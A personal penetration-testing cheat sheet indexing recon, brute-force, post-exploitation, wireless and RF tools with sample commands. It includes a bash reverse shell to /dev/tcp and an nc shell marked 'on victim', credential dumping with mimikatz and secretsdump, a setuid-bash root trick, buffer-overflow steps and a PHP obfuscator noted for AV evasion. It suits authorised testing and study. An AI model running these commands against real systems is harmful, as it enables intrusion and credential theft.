discovery

nmap                        - port scan, use --script=vuln,safe to automatically finding some vulnerabilities / -p- for all ports
	                            nmap scripts in /usr/share/nmap/scripts
	                            good scan
	                            sudo nmap -Pn -p- -O -sV -sS -vvv -oA <logname> -e <iname> --script=default,vuln,safe <target>

                                scripts example:
                                    --script "(default or safe or vuln) and not http-* and not intrusive"

                                scan types:
                                -sT         - TCP Connect (3-Way handshake + RST)
                                -sS*        - TCP Syn Stealth / TCP Half-Open (SYN - SYNACK - RST)
                                -sU*        - UDP
                                -sX*        - XMAS (URG,FIN,PSH) - against posix targets only
                                -sF*        - FIN - against posix targets only
                                -sN*        - NULL - against posix targets only
                                -sA*        - ACK Probe, test if port is filtered (expect RST on every port, service or no service)
                                            * - Requires root

ncat                        - Concatenate and redirect sockets
nping                       - Network packet generation tool / ping utility
ndiff                       - utility to compare nmap scan results (hosts coming up or down, ports opening and closing)
zenmap                      - gui for nmap

rustscan                    - fancy nmap wrapper in rust, -b for batch size, all nmap flags, ex.
                                sudo rustscan -a <host> -r1-65535 -- -O -sV --script default,vuln,safe

enum4linux.pl               - enumerate users, directories, etc on remote hosts
gobuster                    - web directory brute forcer
nikto                       - web directory brute forcer
openvas                     - open vulnerability scanner, browser based
arachni                     - browser based web scanner
wfuzz                       - fuzzing tool
shodan                      - web api based lookup with various informations
theHarvester.py             - passive osint, don't forget to specify -b <source>
recon-ng                    - passive osint
auto-recon-ng               - automatically run all modules on provided hostname, company name,                 
osrframework                - passive osint, allows regex
    osrf mailfy -n 'name'   - search for mails on all mail providers with name in them
    osrf domainfy --whois -n 'name'
                            - get whois information for all domains with name
    osrf searchfy -q <query>
                            - search web for this regex
    osrf usufy -n <name>    - search web for this username
sublist3r                   - osint (passive + active) subdomain finder
dnsenum                     - enumerates dns records for domain. (manual dig -t ns <domain> -> dig axfr @<ns> <domain>)
dnsmap                      - brute force dns server for subdomains
crackmapexec / cme          - multi purpose tool for enumeration and exploitation

----------------------------------------
access

hydra / xhydra                  - network brute force (ssh, ftp, smb, http post/auth, etc)
                                hydra -l <user>|-L <userfile> -p <pass>|-P <passfile> -V -e nsr -I -t <threads> -u -o hydra.log <proto>://<host>:<port>
setoolkit                       - social engineering toolkit, fake websites, etc
BurpSuiteCommunity              - intercepting proxy (shareware)
ZAP                             - OWASP Zad Attack Proxy (foss)
nc                              - netcat
socat                           - multipurpose relay for bidirectional data transfer
pwncat                          - netcat on steroids
smbclient //<ip>/<sharename>    - access samba server (windows file share), get from smb enum (nmap, enum4linux, etc)
SecLists                        - various lists (repositories)
sqlmap                          - sql injection checking
                                	burp suite intercept request
                                	save request to file
                                	sqlmap --dump -r requestfile
                                	sqlmap --dump-all -r requestfile
jsql                            - java sql injection tool
backdoor factory                - patch binaries (PE and ELF) with msf payloads
afl++                           - american fuzzy lop - fuzzer that fuzzes binaries stdin or parses file as argument.
bloodhound                      - active directory graph visualizer to identify attack vectors
neo4j                           - database for bloodhound - sudo -u neo4j neo4j console

----------------------------------------
post

john / johnny               - password cracking
hashcat                     - password cracking
privilege-escalation-awesome-scripts-suite
                            - linpeas.sh / winpeas.exe/bat, copy to target and execute as user to enumerate interesting privesc oportunities
                            git@github.com:carlospolop/privilege-escalation-awesome-scripts-suite.git
linenum                     - another enumeration tool
beef                        - browser exploitation framework
dotdotpwn                   - see "PayloadsAllTheThing/Directory Traversal"
strings                     - find out what programs might call, possibly without absolute path (allows to add own path and execute arbitary code)
floss                       - flare obfuscated string solver, strings but detects obfuscated ones as well, https://github.com/mandiant/flare-floss
chisel                      - pivoting via http or socks5 proxy
proxychains                 - proxying, prepend to any command to use through a proxy
mimikatz                    - windows credentials stealer, including from memory, pass-the-hash, golden tickets. In MSF meterpreter it is run with "load kiwi"
                            https://github.com/gentilkiwi/mimikatz/wiki
evil-winrm                  - access windows remote management server (5985) (sudo gem install evil-winrm)
                            requires user on the target with group "Remote Management Users" (use windows net command to make users and add them to groups (Administrators, Remote Desktop Users, Remote Management Users))
                            can use password (-p) or pass-the-hash (-H) for authentication
freerdp                    - free rdp tool. requires user on target with Remote Desktop Users group
                            Useful flags
                            /dynamic-resolution                 - Allows dynamically changing screen size
                            /size:WIDTHxHEIGHT                  - set screen size static for servers that don't support dynamic
                            +clipboard                          - enable clipboard support
                            /drive:LOCAL_DIRECTORY,SHARE_NAME   - creates a share on the target to our local directory so we can easily transfer files
empire c2                   - Empire command and control
GitTools                    - https://github.com/internetwache/GitTools
                            gitdumper.sh                        - download an exposed .git directory from a website
                            extractor.sh                        - take a local .git directory and recreate the repository in a readable format
                            gitfinder.py                        - search the internet for exposed .git directories
impacket/secretsdump.py     - dump sam hashes
impacket/smbserver.py       - set up SMB server for file up/download
                            smbserver.py share <path/to/share> -smb2support -username <user> -password <pass>

----------------------------------------
wifi/low level networking

aircrack-ng                 - wireless cracking suite
wifite                      - automatic aircrack-ng
aircrack-ng                 - sniff wifi psk
wifipumpkin                 - fake AP, MITM
ettercap / ettercap-gui     - arp poisoning, mitm
bully                       - wps brute force
tcpflow                     - extract files from pcap

----------------------------------------
RF

URH / Universal Radio Hacker    - Tool to record, decode, retransmit and fuzz digital transmissions
GNU Radio Companion             - Graphical SDR tool to do all manner of things
QSSTV                           - SSTV receiver / transmitter
Inspectrum                      - I forgot
GQRX                            - Decoder for audio with waterfall. Also shows data in waterfall but can't decode


----------------------------------------
tools

cyberchef               - web based data pipeline (crypto, encoding, etc)
msfconsole              - metasploit framework, fuck yeah, in meterpreter use bash -i to get shell output in console
msfvenom                - generate payload
meterpreter             - payload
                            - upload/download
                            - load kiwi (mimikatz)
                            - load winpmem (dump ram)
                            - run checkvm
                            - run post/multi/recon/local_exploit_suggester
                            - getprivs
                            - sysinfo
                            - getuid
                            - migrate
                            - run post/windows/manage/enable_rdp
                            - pivoting with autoroute
                            - starting a proxy to use with proxychains
hexdump                 - hexdump terminal, -C flag for pretty output
cutter                  - frontend for radare2 decompiler/disassembler
ida_free                - ida disassembler
okteta                  - hex editor
ipython                 - python interpreter with some advanced features
wingide                 - good python ide
sublime text            - text editor, multi ide
vim                     - vim
cherrytree              - Hirachical note taking application (richtext), saves to sqlite or xml
searchsploit            - tool to search local copy of exploit db (https://www.exploit-db.com)
                            use -x flag to show file results
                            use -m flag to save file locally
dos2unix                - use this to convert dos line endings from searchsploit into unix line endings...
crypttool 1/2/j         - crypto analytics

reverse shells: https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
bash reverse tcp
	on victim
	command "/bin/bash -c '/bin/bash -i >& /dev/tcp/$IP/$PORT 2>&1 0>&1'"
    or
    /bin/sh | nc $IP $PORT

	on attacker
	pwncat.sh -l -p $PORT
		pwncat> enum -s -e              - enumerates target (run on local mode)

man, whatis, whereis, type (command)    - information about command
python -m http.server <port>
jq                                      - pretty print json
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 600
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 600 -q <rev EIP>
immunity debugger plugin mona           - https://github.com/corelan/mona
                                        	paste to C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands
                                        	!mona config -set workingfolder c:\mona\%p

                                        	find distance to unique pattern (msf pattern_create) in EIP
                                        	!mona findmsp -distance 600

                                        	find jump point with the address not containing any of the bad chars indicated
                                        	!mona jmp -r esp -cpb "\x00\x0a\x0d"
                                        	!mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "\x00\x0a\x0d"

                                        	create byte array with badchars indicated and compare with address (cstring-array)
                                        	!mona bytearray 256 -b "\x00\xff"
                                        	!mona compare -f C:/mona/%p/bytearray.bin -a <address>

iptraf                                  - watch network trafic
iftop                                   - watch network trafic
nethogs                                 - watch network trafic, also displays process
subnetcalc                              - subnet calculator
grab -A<N>                              - grab N lines after initial find
exiftool                                - tool for reading and manipulating image file metadata
https://www.gaijin.at/en/tools/php-obfuscator
                                        - obfuscate php code for av evasion. also makes it smaller and one line
ciphey                                  - decoder/cracker/analyzer for unknown ciphertext
curl                                    - make web requests
                                            - default get
                                            - -X <VERB> to use the specified verb, such as POST
                                            - --data "<DATA>" to send the data in the body with the request
                                            - -c <file> uses file as a cookiejar to store all received cookies
                                            - -b <file|data> uses file or text data to load cookies to send. format "KEY=VAL; KEY2=VAL2"
wireshark                               - read network traffic.
                                        to capture remote packets:
                                        1. create named pipe on local system
                                            mkfifo /tmp/packet_capture
                                        2. run tcpdump with filter and put that into the named pipe
                                            ssh user@remote "sudo /usr/sbin/tcpdump -s 0 -U -n -w - -i eth0 'not (port 22 and host 192.168.1.13)'" > /tmp/packet_capture
                                            -s 0: no length limit
                                            -U: unbuffered, send immediately to output
                                            -n: don't convert addresses to hostnames
                                            -w - write to stdout
                                            -i eth0: capture only interface eth0
                                            'not (port 22 and host 192.168.1.13)', filter the traffic generated by the ssh session
                                                other useful filters:
                                                -i <iface>
                                                host <ip>
                                                port <port>
                                                src port <port>
                                                portrange <start>-<end>
                                                src <ip>
                                                dst <ip>
                                                net <subnet (CIDR)>
                                                <prot (icmp, ip6, tcp, udp, ...)>
                                                less/greater/<=/>=/... <packet size in B>
                                                and/&& , or/||, not/!
                                        3. start wireshark
                                            wireshark -k -i /tmp/packet_capture
                                            -k: start immediately
                                            -i: interactive
                                        4. delete pipe if desired
                                            rm /tmp/packet_capture
cmatrix                                 - because why the fuck not
foremost                                - find files embedded in other files

----------------------------------------
references

PayloadsAllTheThings/Methodology and Resources
                                - reference for a myridad of ways to have bind/reverse tcp in different languages and processes (nc, powershell, python, etc)
                                git@github.com:swisskyrepo/PayloadsAllTheThings.git
Pentest-Cheatsheets             - git@github.com:Tib3rius/Pentest-Cheatsheets.git


https://book.hacktricks.xyz/
https://gtfobins.github.io - information on how to exploit binaries for PE with different methods

wildcard injection - bash (tar cf archive.tar *)
https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

shodan - web api based database on open ports and vulnerabilities

Static binaries                 - https://github.com/ernw/static-toolbox/releases/download/1.04/nmap-7.80SVN-x86_64-a36a34aa6-portable.zip


----------------------------------------
how tows

python virtual environments

create environment
	virtualenv [-p python_bin] name

creates directory with name
	source name/bin/activate
sets up the environment to be used
deactivate stops the environment from being used

use pip / python / etc will install everything there



python update system wheels
sudo -H pip install --update PKGNAME



setuid on /bin/bash
invoke with -p flag to get root shell



unbuffer
in front of command will make it think it outputs to interactive even though it outputs to pipe
this preserves formatting



sudoers.d can have files. hostname = (username) command
allows command to be excuted as username from hostname
sudo allows to specify hostname with -h flag



python webrequest
import requests
data = {"name":"value", ...}
r = requests.post(url, data)
print(r)
print(r.text)



windows passwords in
C:/windows/system32/config/sam




docker
docker ps                               - list containers
docker exec -it <name> <cmd>            - execute command inside container (use /bin/bash for shell)
-p [ip:]:<hostport>:<ctnrport>[/prot]   - publish container ports to host ports
